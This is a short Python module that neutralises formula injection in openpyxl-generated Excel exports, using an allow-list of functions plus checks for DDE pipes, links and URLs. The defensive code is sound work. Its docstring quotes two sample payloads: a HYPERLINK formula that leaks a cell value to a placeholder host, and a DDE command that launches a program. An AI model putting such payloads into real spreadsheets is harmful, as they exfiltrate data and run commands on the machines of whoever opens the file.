"""Formula-injection guard for generated Excel files.

openpyxl stores any string that starts with "=" as a formula, so a note or description such as
`=HYPERLINK("http://x/?"&A1,"tık")` or a DDE payload (`=cmd|' /C calc'!A0`) would run when the file is
opened. The exports also write their own formulas, so instead of escaping every string, `neutralize`
turns a formula back into plain text unless it only uses the functions our exports use and has no
DDE pipe, external workbook link or URL.
"""
from __future__ import annotations

import re

from openpyxl import Workbook

SAFE_FUNCS = {"COUNTIF", "COUNTIFS", "FIND", "IF", "IFERROR", "ISNUMBER", "OR", "AND", "NOT", "ROUNDUP",
              "ROUND", "SUBTOTAL", "SUM", "SUMIF", "SUMIFS", "SUMPRODUCT"}
_STRING = re.compile(r'"(?:[^"]|"")*"')
_FUNC = re.compile(r"([A-Za-z_][A-Za-z0-9_.]*)\s*\(")


def safe_formula(f: str) -> bool:
    rest = _STRING.sub('""', f)
    if any(x in rest for x in ("|", "[", "://", "\\\\")):
        return False
    return all(name.upper() in SAFE_FUNCS for name in _FUNC.findall(rest))


def neutralize(wb: Workbook) -> Workbook:
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for c in row:
                if c.data_type == "f" and isinstance(c.value, str) and not safe_formula(c.value):
                    c.data_type = "s"
    return wb
